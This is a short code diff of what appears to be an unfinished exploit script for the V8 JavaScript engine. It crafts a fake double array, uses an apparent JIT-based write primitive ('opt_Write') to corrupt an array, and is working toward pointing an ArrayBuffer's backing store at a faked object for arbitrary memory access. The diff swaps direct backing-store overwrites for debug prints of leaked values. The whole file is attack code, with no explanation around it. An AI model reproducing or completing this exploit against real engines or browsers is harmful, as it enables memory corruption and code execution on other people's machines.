@@ -126,10 +126,14 @@ var fake_dba = [
     2.1729236899484e-311,
     2.1729236899484e-311,
     2.1729236899484e-311
-]
+];
+
+var target_aba = new ArrayBuffer(0x100);
 
 print("layout: ");
-%DebugPrint(fake_dba); // offset is 0x60, fixed.
+%DebugPrint(fake_dba);
+%DebugPrint(target_aba);
+
 // %DebugPrint(target_ara);
 
 // now, try to leak fake_aba, and return it as a normal JSArray Obj.
@@ -170,12 +174,11 @@ opt_Write(arr10, arr10);
 // extract a val
 %DebugPrint(arr10);
 
-var target_ara = new ArrayBuffer(0x100);
-%DebugPrint(target_ara);
 print("val to write: " + fake_dba_addr);
-arr10[0][22] = fake_dba_addr; // let ArrayBuffers' backing store pointing at faked dba addr as a test.
-arr10[0][23] = fake_dba_addr; 
-arr10[0][24] = fake_dba_addr; 
+print(arr10[0][0]);
+print(arr10[0][1]);
+print(arr10[0][2]);
+print(arr10[0][3]);
 dstub("tbc");
 
 // %DebugPrint(fake_map);
